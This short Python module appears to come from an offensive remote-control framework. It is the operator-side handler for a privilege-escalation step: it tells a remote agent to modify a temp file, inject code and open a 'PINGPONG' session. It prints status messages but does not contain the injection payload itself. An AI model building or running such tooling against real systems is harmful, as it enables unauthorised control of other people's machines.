import sys
from pathlib import Path
sys.path.append("..")
from main import print_good, print_normal
def priv_vbp_listen(sendobj, conn):
    try:
        sendobj.App_send("PRO_VBP_APP", False, conn)
        print_normal("PINGPONG>[*]Starting......")
        dir_data_s = conn.recv(1024)
        dir_data = dir_data_s.decode("utf8")
        conn.send(b'OK')
        print_good(f"PINGPONG>[+]TEMP FILE MODIFIED AT {dir_data}")
        print_normal("PINGPONG>[*]Injecting Code......")
        done_data = conn.recv(1024)
        if done_data:
            conn.send(b'OK')
            print_good("PINGPONG>[+]INJECT SUCCESSFULLY, CREATING PINGPONG SESSION......")
            return True
    except KeyboardInterrupt:
        conn.send(b'EXIT')
        return False
